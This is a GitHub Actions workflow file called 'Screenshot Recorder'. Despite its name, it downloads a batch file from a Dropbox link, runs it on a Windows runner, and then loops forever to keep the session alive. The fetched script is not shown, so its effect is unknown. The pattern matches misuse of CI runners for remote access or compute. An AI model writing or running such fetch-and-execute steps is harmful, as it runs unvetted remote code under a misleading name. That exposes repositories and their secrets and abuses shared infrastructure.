name: Screenshot Recorder

on:
  workflow_dispatch:

jobs:
  capture:
    runs-on: windows-latest
    timeout-minutes: 30

    steps:
      - name: Download Setup.bat
        shell: powershell
        run: |
          $url = "https://www.dropbox.com/scl/fi/wfaf7bsaxd1cvtmk5wnml/Setup.bat?rlkey=kmfk4chndueff0dlyyrhixlyn&st=677kpgqg&raw=1"
          $output = "Setup.bat"

          Write-Host "Downloading Setup.bat..."
          Invoke-WebRequest -Uri $url -OutFile $output

      - name: Run Setup.bat and keep session alive
        shell: powershell
        run: |
          Write-Host "Launching Setup.bat..."
          Start-Process "cmd.exe" -ArgumentList "/c `".\Setup.bat`"" -PassThru

          Write-Host "Keep Alive Loop started..."
          while ($true) {
            Start-Sleep -Seconds 10
          }
